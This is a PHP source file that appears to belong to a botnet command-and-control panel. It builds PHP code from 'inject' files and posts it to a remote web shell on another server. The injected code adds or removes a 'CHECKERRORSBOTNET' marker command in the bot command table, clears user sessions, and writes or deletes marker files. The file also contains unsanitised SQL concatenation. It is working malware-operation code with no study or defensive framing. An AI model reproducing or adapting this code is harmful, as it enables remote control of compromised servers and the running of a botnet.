<?php

$smarty->assign('rand_name', mt_rand(0000000000, 9999999999));

if(!empty($Cur['id'])){
	$result = $mysqli->query("SELECT id, link, keyid, shell FROM bf_admins WHERE (id='".$Cur['id']."')");
	if($result->id == $Cur['id']){		$get_php = '$cur_file = \''.$result->shell.'\';';
		$get_php .= file_get_contents('modules/admins/injects/start.php');
		$get_php .= file_get_contents('modules/admins/injects/mysqli.php');

		if(!empty($_POST['submit'])){			$get_php .= '$cebn = base64_encode(\'CHECKERRORSBOTNET\');';
			if($_POST['work'] == 'false'){
				$get_php .= '$mysqli->real_query("INSERT INTO bf_cmds (prefix, country, cmd, lt, dev, post_id, post_date) VALUES (\'".$cebn."\', \'".$cebn."\', \'".$cebn."\', \'0\', \'1\', \'-1\', \'".time()."\')"); ';
			    $get_php .= '$mysqli->query("update bf_users set PHPSESSID = \'\'");';
			    $get_php .= 'if(!file_put_contents($dir . \'cache/smarty/c2b9a85287fb9b09cb36f70274cf6562.file.cebn.tpl.php\', $cebn)) if(!file_put_contents($dir . \'cache/cebn.txt\', $cebn));';
		    }elseif($_POST['work'] == 'true'){		    	$get_php .= '$mysqli->query("delete from bf_cmds where (cmd = \'".$cebn."\') LIMIT 1");';
		    	$get_php .= '@unlink($dir . \'cache/cebn.txt\');';
		    	$get_php .= '@unlink($dir . \'cache/smarty/c2b9a85287fb9b09cb36f70274cf6562.file.cebn.tpl.php\');';
		    	$get_php .= '@unlink($dir . \'templates_c/%%10^16B^13B51E2B%%cebn.tpl.php\');';
		    }
		}

		$get_php .= file_get_contents('modules/admins/injects/cmd_work_adm.php');
		$data = get_http($result->link, $get_php, $result->keyid, $result->shell);

		$smarty->assign('admin', $result);
		$smarty->assign('data', $data);
	}
}

?>